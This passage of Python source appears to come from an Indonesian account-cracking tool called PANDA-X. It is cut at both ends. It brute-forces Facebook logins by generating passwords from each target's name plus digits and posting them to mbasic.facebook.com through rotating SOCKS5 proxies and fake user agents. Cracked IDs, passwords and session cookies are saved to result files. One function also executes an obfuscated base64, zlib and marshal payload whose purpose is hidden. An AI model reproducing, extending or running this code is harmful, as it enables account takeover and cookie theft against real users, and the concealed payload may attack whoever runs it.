					cetak(panel(f'0%s %s ([yellow] %s [white]ID )'%(nom,isi,len(hem))))
				else:
					lol.update({str(cih):str(isi)})
					cetak(panel(''+str(cih)+' '+isi+' ([yellow] '+str(len(hem))+' [white] ID )'+x))
			geeh = input(N+'['+M+'●'+N+'] KETIK PILIHAN : ')
			try:geh = lol[geeh]
			except KeyError:
				cetak(nel('[red]Pilih Yang Benar [white]'))
				exit()
			try:lin = open('PANDA-X/result-cp/'+geh,'r').read().splitlines()
			except:
				cetak(nel('[red]Tidak Ada File [white]'))
				time.sleep(2)
				exit()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cetak(nel(f" [bold yellow]\n{cpkuni[0]}|{cpkuni[1]}\n",width=35, style="bold red"))
				nocp +=1
			print('')
			exit()
	elif kz in ['1','01']:
		try:vin = os.listdir('PANDA-X/result-ok')
		except FileNotFoundError:
			cetak(nel('[red]Tidak Ada File [white]'))
			time.sleep(2)
			exit()
		if len(vin)==0:
			cetak(nel('[red]Relust [green]OK[red] tidak Ada [white]'))
			time.sleep(2)
			exit()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('PANDA-X/result-ok/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					cetak(nel(f'%s %s ( [green]%s[white] ID )'%(nom,isi,len(hem))))
				else:
					lol.update({str(cih):str(isi)})
					cetak(nel(f'%s %s ([green] %s [white]ID )'%(cih,isi,(len(hem)))))
			geeh = input(f'\nPilih : ')
			try:geh = lol[geeh]
			except KeyError:
				cetak(nel('[red]Pilih Yang Benar [white]'))
				exit()
			try:lin = open('PANDA-X/result-ok/'+geh,'r').read().splitlines()
			except:
				cetak(nel('[red]Tidak Ada File [white]'))
				time.sleep(2)
				exit()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				cetak(nel(f"\n [bold green]{cpkuni[0]}|{cpkuni[1]}\n",subtitle="╭────[white] [[bold green]USERAGENT[white]][blue]",subtitle_align="left", title="[bold green]OK",width=35, style="bold red "))
				print(f'\b\033[91;1m   ╰─ > \033[32m{cpkuni[2]}\033[1;37m')
				nocp +=1
			print('')
			exit()
	elif junz in ['3','03']:
		exit()
	else:
		print("\n ╰─ >> \033[91;1mMaling Akun Elit Ngetik Sulitt..!", end='\r');time.sleep(0.2);print("                     ", end='\r');setting()
		exit()
###------------------------------------------------------------------>
#     *PENGATURAN APLIKASI*
###------------------------------------------------------------------>
def cekapk():
	print("")
	sayy =Tree(Panel.fit(f"""{P2}berhasil mengumpulkan{H2} {len(id)} {P2}Idz""",style=f"{color_panel}"),guide_style="bold grey100")
	sayy.add(Panel.fit(f"""[bold red]memunculkan aplikasi bisa membuat akun terkena checkpoint/dinonaktifkan""",style=f"{color_panel}"),guide_style="bold grey100")
	sayy.add(Panel.fit(f'{P2}Apakah Anda Ingin Menampilkan Aplikasi Yang Terkait Di Dalam Akun?',width=80,title=f"{H2}Setting Apk",style=f"{color_panel}"))
	prints (sayy)
	junxapk = input(f'     └──>{h} Y/t? :{x} ')
	if junxapk in ['']:
		print(' ╰─ > Minimal Bisa Ngetik Dekk..! ');back()
	elif junxapk in ['y','Y']:
		munculapk.append('ya');setting()
	else:
		munculapk.append('no');setting()
###------------------------------------------------------------------>
#     *PENGATURAN IDZ
###------------------------------------------------------------------>
def setting():
	print('')
	cetak(panel(f'{P2}[[bold cyan]01[/]{P2}][/] {P2}Crack From New To Old\n{P2}[[bold cyan]02[/]{P2}][/] {P2}Crack From Old To New\n{P2}[[bold cyan]03[/]{P2}][/] {P2}Random Idz Old And New',width=55,title=f"{H2}Crack From",style=f"{color_panel}"));hu = input(f'└──>{h} Pilih Urutan Idz :{x} ')
	if hu in ['1','01']:
		muda=[]
		new=('Crack From New')
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['2','02']:
		new=('Crack From Old')
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['3','03']:
		new=('Random All Idz')
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print("\n ╰─ >> \033[91;1mMaling Akun Elit Ngetik Sulitt..!", end='\r');time.sleep(0.2);print("                     ", end='\r')
		exit()
	
	sayy =Tree(Panel.fit(f"""{P2}Jika Inggin Mengunakan Notifikasi, Pastikan\nSudah Pernah Install pkg install play-audio\nJika Belum Pernah, Install Perintah Terlebih Dahulu\nJika Tidak Maka Sound Notif Akan Error""",width=63,title=f"{H2}Setting Sound",style=f"{color_panel}"))
	sayy.add(Panel.fit(f"""{P2}Dapatkan Notifikasi Setiap Mendapat Hasil.?""",style=f"{color_panel}"),guide_style="bold grey100")
	prints(sayy)
	junsound = input(f'     └──>{h} Y/t? :{x} ')
	if junsound in ['y','Y']:
		sound.append('ya');ngentode()
	if junsound in ['t','T']:
		sound.append('no');ngentode()
	if junsound in ['']:
		print("\n ╰─ >> \033[91;1mMaling Akun Elit Ngetik Sulitt..!", end='\r');time.sleep(0.2);print("                     ", end='\r')
		back()
	else:
		print("\n ╰─ >> \033[91;1mMaling Akun Elit Ngetik Sulitt..!", end='\r');time.sleep(0.2);print("                     ", end='\r')
		exit()
	
def ngentodee():
	method.append('ba');jun_terr()

def ngentode():
	sayy =Tree(Panel.fit(f"""{P2}Pilih Method Yang Cocok Di Device Kamu,\nBisa Chat Saya Jika Ada Kendala..""",width=80,title=f"{H2}Method",style=f"{color_panel}"))
	prints(sayy)
	urut = []
	urut.append(Panel.fit(f'{P2}[[bold cyan]01[/]{P2}][/] {P2}Method {H2}m.basic{P2} [/] {P2}({M2} Validate{P2} )       \n{P2}[[bold cyan]02[/]{P2}][/] {P2}Method {H2}m.basic{P2} [/] {P2}({M2} Reguler{P2} )       \n{P2}[[bold cyan]03[/]{P2}][/] {P2}Method {H2}mobile{P2} [/]  {P2}({M2} Validate{P2} )\n{P2}[[bold cyan]04[/]{P2}][/] {P2}Method {H2}B-Api{P2} [/]   {P2}({M2} Async{P2} )                           ',width=55,style=f"{color_panel}"))
	console.print(Columns(urut))
	Met = input(f'└──>{h} Pilih Metode :{x} ')
	if Met in ['1','01']:
		method.append('mb');jun_terr()
	elif Met in ['2','02']:
		method.append('test');jun_terr()
	elif Met in ['3','03']:
		method.append('ba');jun_terr()
	elif Met in ['4','04']:
		method.append('ms');jun_terr()
	#########elif Met in ['5','05']:
		#####method.append('ms');jun_terr()
	#########elif Met in ['6','06']:
		#####method.append('ba');jun_terr()
	else:
		print("\n ╰─ >> \033[91;1mMaling Akun Elit Ngetik Sulitt..!", end='\r');time.sleep(0.2);print("                     ", end='\r')
###------------------------------------------------------------------>
#     *PENGATURAN PASSWORD
###------------------------------------------------------------------>
def jun_terr():
	cetak(panel(f'{P2}[[bold cyan]01{P2}] {P2}Automatic Password\n{P2}[[bold cyan]02{P2}] {P2}Combination Password \n{P2}[[bold cyan]03{P2}] {P2}Add Manual Password ',width=55,title=f"{H2}Pilih Password",style=f"{color_panel}"))
	pwplus=input(f'{P}└── > \033[32m' )
	if pwplus in ['03','3']:
		prints(Panel(f"""{P2}silahkan buat katasandi dengan , (koma) sebagai pemisah tiap katasandi
{H2}Contoh{P2} : jun,pakaya,orang,paling,tamvan,""",width=80,style=f"{color_panel}"));prints(Panel(f"""{P2}Password Sangat Berpengaruh Dalam Crack Akun
Semakin Banyak Kombinasi Semakin Lama Proses Crack""",width=80,style=f"{color_panel}"))
		pwpluss.append('ya')
		pwku=input(f'└──>{h} Password? :{x} ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
###------------------------------------------------------------------>
#     *DAFTAR PASSWORD*
###------------------------------------------------------------------>
def passwrd():
	os.popen('play-audio scmusic/hai.mp3')       
	global prog,des
	urut = []
	print("")
	mekmek = Tree(Panel.fit(f"""{P2}Airplane Mode for 5 Seconds If Not Getting Results.\nIf 1000 Idz Results Dont Come Out Change Target""",width=58,style=f"{color_panel}"))
	mekmek.add(Panel.fit(f"""[bold white]CP Save in [bold yellow]{rescp}""",style=f"{color_panel}"),guide_style="bold grey100")
	mekmek.add(Panel.fit(f"""[bold white]OK Save in [bold green]{resok}""",style=f"{color_panel}"),guide_style="bold grey100")
	prints(mekmek)
	wa.print(Columns(urut))
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idzku,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'1')
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						#pwv.append('gorontalo')
						#pwv.append('gorontalo123')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'1')
						pwv.append(frs+'03')
						pwv.append(frs+'02')
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'06')
						pwv.append(frs+'07')
						pwv.append(frs+'08')
						pwv.append(frs+'09')
						pwv.append(frs+'10')
						#pwv.append('bismillah')
						#pwv.append('bangsadd')
						#pwv.append('gorontalo123')
						#pwv.append('gorontalo')
						#pwv.append('sayangku1')
						#pwv.append('pakaya')
						#pwv.append('kambing')
						#pwv.append('cuakkkz')
						pwv.append(frs+'11')
						pwv.append(frs+'12')
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				if 'ya' in pwpluss: 
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mf' in method:
					pool.submit(mf,idzku,pwv)
				elif 'mb' in method:
					pool.submit(mb,idzku,pwv)
				elif 'test' in method:
					pool.submit(test,idzku,pwv)
				elif 'ff' in method:
					pool.submit(ff,idzku,pwv)
				elif 'ba' in method:
					pool.submit(ba,idzku,pwv)
				elif 'ms' in method:
					pool.submit(ms,idzku,pwv)
				else:
					pool.submit(ba,idzku,pwv)
		print('')
	os.popen('play-audio scmusic/bayy.mp3')       
	print(f'  {h}╰─ >>{x} Mendarat Denggan Selamat..')
	print(f'  {h}╰─ >>{x}{h} OK : {h}%s '%(ok))
	print(f'  {h}╰─ >>{x}{k} CP : {k}%s{x} '%(cp))
	print("")
	print(f'  {h}╰─ >>{x} Lanjut Crack Kembali ( Y/t ) ? ')
	pky = input(f'  {h}╰─ >>{x} Pilih : ')
	if pky in ['y','Y']:
		lologoku()
		junxua()
	else:
		print(f'\t{x}>>{k} Semoga Harimu Full Senyum:){x} << ')
		time.sleep(2)
		exit()
def gilak():
	try:
		token = open('PANDA-X/cokiku.txt','r').read()
		cok = open('PANDA-X/tokenku.txt','r').read()
	except IOError:
		time.sleep(4)
		_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'=U6ps76F07ht4h//jP/Pl0fjn7zVnXveWrPCPoe+9SPEPO47H49nv/0Q/aDbc7rPz0N4BVQvfd7x7mMV80G1e/+5dn/mlnf9c81Th+1xmPM6TmZKhHvf/KqcNnFWU/+Z9PTI96dscZ/p+UgHnEUFfPgXtYHytfE10dXbnhZXQxWKhGtyw2TzMXI1mxmcUqo4Ykpp3zRrdwwi892a9iRkM0bSHAXQJQQlmlDD0tK6pLIMNoMcGFCIRhbY5n+ORv7sJgkaSykJ0fhj9GHM12vbitq1jmV7Xm4+vviLTmSZBbr2W+QXAXPvljbTPtsCXFAuKgchHztL7Oj2GmvoTltK+l+uU5p2OTi2lUBgpbRR13TUbJC0cWCsiZm08qz3gcRqe8W9vQSHkEPUY5JAS1V8ePL5rYHCdEjku2DyzeROL1E69Br+oEi1dYEoHyaa5FvqP6ht5hGVFJxtuQJVenqreSy0IQGyBw39ZUydXBW8Z2bOp9tYY5nqt0d0mX8Sr0oOZJIuR8FhK/zMJD+WxY5UOOuph18SI/utgDfAmkz2eaaN6e/xF2IYS1v13xIiq+gQ0pWtpAq+gLqKqIR1u408B4Yo0YdEKmORwRK5DML17KMoLTaOmE62H4sj4xZK+OPK0VqHgni4Ziras2Z1Rj3p1hPjJ2qFIt+LVl7IlQJ0TX7dkhTCSQe/hTV0c7jyYHdp9dJ6rKqPgbtbKhxzVhh78qH551KhTy7c+GGqvFgGu43oL/qH44oFDsMDrZudrdo2Cotk1R0LjUARChkdUHvKrrTmyJwz20v2d3AKCtuRqTyzQKMRc53qE7ZA7MnM0dAfEHcTQ0YDFZ5h7NMca6kIvtH4ZoBA9hJ0k1CLxRFM3Mlje9IqQKy4C3yl9FFyN4a3ZpiVzaRR/Ar8xqnSlrBb0xu/9oSM07Rau8QgHSeavkxgf2HoFCpDde3apE8Sq0ujLI4auUg7u244X/FHrZeVkeORgs231GA14FQGWRfN8uUxW7st3ULdLjC+5i5MaOzesuaKAwpxR9GzeU/vA1035So57WVHvOVldMVGRLVIewlDqocjc+VoPjlCOMcMH4iUai/1j9OK6RQ9UIozZUA2WGZXJ98aeuhR+sd7KPhty2Ogj5+5UpEJxwLeRq1zN3HptQWsjaA4WzOomiZNtguQZeUeWvmJUy4a9GYYdEjp2NAVuDGmyolEoxPDCXiXZykIPHIACLTa3AL3pbxZOtfT4Kpl4JFk0gosuAmkYChmucEEECpR9OGbNRTOqDnp54h2AFJPjp7U2RVib3O6g45nA+1rDNGeg22u+78fb+G0AltfGaC9+qkA0PT8e+xpn/7mq/L0EB/OzG475c+ASDNtnoPrrSKpVlMUeTJK7A99iqMvTnfZaGtobGcrDmVNWmFLAKZClpJoC6i5dlybkXuhUY22KnMllxJe'))
###------------------------------------------------------------------>
#     *PEMBUATAN AKUN HASIL CRACK*
###------------------------------------------------------------------>
def junzth(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		elif fx[:5] in ['61','615']:tahunz = 'NEW'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz

###------------------------------------------------------------------>
#     *LOGO BRAZZER*
###------------------------------------------------------------------>
def lologoku():
	if "linux" in sys.platform.lower():
		try:os.system('clear')
		except:pass
	elif "win" in sys.platform.lower():
	    try:os.system('cls')
	    except:pass
	else:
	    try:os.sytem('clear')
	    except:pass

	#wel = '# SHARE TOOLS'
	#wel2 = mark(wel, style='red')
	#sol().print(wel2)
	print("")
	au="""[bold cyan]
[bold blue]██████[bold yellow]╗[bold blue]  █████[bold yellow]╗[bold blue] ███[bold yellow]╗   [bold blue]██[bold yellow]╗[bold blue]██████[bold yellow]╗[bold blue]  █████[bold yellow]╗[bold blue][bold red] ██[bold yellow]╗  [bold red]██[bold yellow]╗
[bold blue]██[bold yellow]╔══[bold blue]██[bold yellow]╗[bold blue]██[bold yellow]╔══[bold blue]██[bold yellow]╗[bold blue]████[bold yellow]╗[bold blue]  ██[bold yellow]║[bold blue]██[bold yellow]╔══[bold blue]██[bold yellow]╗[bold blue]██[bold yellow]╔══[bold blue]██[bold yellow]╗[bold red][bold yellow]╚[bold red]██[bold yellow]╗[bold red]██[bold yellow]╔╝
[bold blue]██████[bold yellow]╔╝[bold blue]███████[bold yellow]║[bold blue]██[bold yellow]╔[bold blue]██[bold yellow]╗ [bold blue]██[bold yellow]║[bold blue]██[bold yellow]║  [bold blue]██[bold yellow]║[bold blue]███████[bold yellow]║[bold red][bold yellow] ╚[bold red]███[bold yellow]╔╝   
[bold blue]██[bold yellow]╔═══╝[bold blue] ██[bold yellow]╔══[bold blue]██[bold yellow]║[bold blue]██[bold yellow]║╚[bold blue]██[bold yellow]╗[bold blue]██[bold yellow]║[bold blue]██[bold yellow]║ [bold blue] ██[bold yellow]║[bold blue]██[bold yellow]╔══[bold blue]██[bold yellow]║[bold red] ██[bold yellow]╔[bold red]██[bold yellow]╗ 
[bold blue]██[bold yellow]║  [bold blue]   ██[bold yellow]║ [bold blue] ██[bold yellow]║[bold blue]██[bold yellow]║ ╚[bold blue]████[bold yellow]║[bold blue]██████[bold yellow]╔╝[bold blue]██[bold yellow]║  [bold blue]██[bold yellow]║[bold red]██[bold yellow]╔╝[bold red] ██[bold yellow]╗
[bold blue][bold yellow]╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ 
[white][bold green]\nCopyright By Jun.Pakaya 06 2023[white]                           [bold red]● [bold yellow]● [bold green]● [bold white]"""
    
	junId=nel(au,style="#FFFF00")
	cetak(nel(junId, title='[bold red]>[bold yellow]>[bold green]>[bold white] ( [#00FF00]Banner [bold white]) [bold green]<[bold yellow]<[bold red]<'))

	
	
###------------------------------------------------------------------>
#     *METODE MBASIC.FACEBOOK*
###------------------------------------------------------------------>
def mb(idzku,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold white][[bold green]{loop}[bold white] / [bold green]{len(id)}[bold white]]-[OK - [bold green]{ok}[bold white]]:-:[CP - [bold yellow]{cp}[bold white]][/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host':
 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
,'sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idzku+'&flow=login_no_pin&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idzku,"next":"https://mbasic.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idzku+'&flow=login_no_pin&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in sound:
					##tree = Tree(Panel.fit(f"""[bold red] - {junzth(idzku)} """,style=f"{color_panel}"),guide_style="bold grey100")
					##tree.add(Panel.fit(f"""[bold yellow] {idzku}|{pw} """,style=f"{color_panel}"),guide_style="bold grey100")
					##prints(tree)
					print(f"┗━━{K}{idzku}|{pw}{x}{N}")
					##akku = Tree(Panel.fit(f"""[bold red] UGENT """,style=f"{color_panel}"),guide_style="bold grey100")
					##akku.add(Panel.fit(f"""[bold cyan]Safari;{ua}""",style=f"{color_panel}"),guide_style="bold grey100")
					##prints(akku)
					open('PANDA-X/result-cp/'+rescp,'a').write(idzku+'|'+pw+'\n')
					open('/sdcard/PANDA-X/result-cp/'+rescp,'a').write(idzku+'|'+pw+'\n')
					akun.append(idzku+'|'+pw)
					cp+=1
					break
				elif 'ya' in sound:
					os.popen('play-audio scmusic/cepe.mp3')       
					##tree = Tree(Panel.fit(f"""[bold red] - {junzth(idzku)} """,style=f"{color_panel}"),guide_style="bold grey100")
					##tree.add(Panel.fit(f"""[bold yellow] {idzku}|{pw} """,style=f"{color_panel}"),guide_style="bold grey100")
					##prints(tree)
					print(f"┗━━{K} {idzku}|{pw}{x}{N}")
					##akku = Tree(Panel.fit(f"""[bold red] UGENT """,style=f"{color_panel}"),guide_style="bold grey100")
					##akku.add(Panel.fit(f"""[bold cyan]Safari;{ua}""",style=f"{color_panel}"),guide_style="bold grey100")
					##prints(akku)
					open('PANDA-X/result-cp/'+rescp,'a').write(idzku+'|'+pw+'\n')
					open('/sdcard/PANDA-X/result-cp/'+rescp,'a').write(idzku+'|'+pw+'\n')
					akun.append(idzku+'|'+pw)
					cp+=1
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'ya' in sound:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					os.popen('play-audio scmusic/oke.mp3')       
					#tree = Tree(Panel.fit(f"""[bold red] - {junzth(idzku)} """,style=f"{color_panel}"),guide_style="bold grey100")
					#tree.add(Panel.fit(f"""[bold green] {idzku}|{pw} """,style=f"{color_panel}"),guide_style="bold grey100")
					#prints(tree)
					print(f"┗━━ {H}{idzku}|{pw}")
					print(f'\r{H}{kuki}{N}{x}')
					print(f'\r{H}viabrowser;Safary={ua}{N}{x}')
					#akku = Tree(Panel.fit(f"""[bold red] UGENT """,style=f"{color_panel}"),guide_style="bold grey100")
					#akku.add(Panel.fit(f"""[bold cyan]Safari;{ua}""",style=f"{color_panel}"),guide_style="bold grey100")
					#prints(akku)
					open('PANDA-X/result-ok/'+resok,'a').write(idzku+'|'+pw+'|'+kuki+'\n')
					open('/sdcard/PANDA-X/result-ok/'+resok,'a').write(idzku+'|'+pw+'|'+kuki+'\n')
					cek_apk(session,coki)
					break
				if 'no' in sound:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					#tree = Tree(Panel.fit(f"""[bold red] - {junzth(idzku)} """,style=f"{color_panel}"),guide_style="bold grey100")
					#tree.add(Panel.fit(f"""[bold green] {idzku}|{pw} """,style=f"{color_panel}"),guide_style="bold grey100")
					#prints(tree)
					print(f"┗━━ {H}{idzku}|{pw}")
					print(f'\r{H}{kuki}{N}{x}')
					print(f'\r{H}viabrowser;Safary={ua}{N}{x}')
					#akku = Tree(Panel.fit(f"""[bold red] UGENT """,style=f"{color_panel}"),guide_style="bold grey100")
					#akku.add(Panel.fit(f"""[bold cyan]Safari;{ua}""",style=f"{color_panel}"),guide_style="bold grey100")
					#prints(akku)
					open('PANDA-X/result-ok/'+resok,'a').write(idzku+'|'+pw+'|'+kuki+'\n')
					open('/sdcard/PANDA-X/result-ok/'+resok,'a').write(idzku+'|'+pw+'|'+kuki+'\n')
					cek_apk(session,coki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
###------------------------------------------------------------------>
#     *METODE TESTING*
###------------------------------------------------------------------>
def test(idzku,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold white][[bold green]{loop}[bold white] / [bold green]{len(id)}[bold white]]-[OK - [bold green]{ok}[bold white]]:-:[CP - [bold yellow]{cp}[bold white]][/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://mbasic.facebook.com/login/?email='+idzku).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idzku,
'pass':pw
}
			ses.headers.update({'Host': 'mbasic.facebook.com',
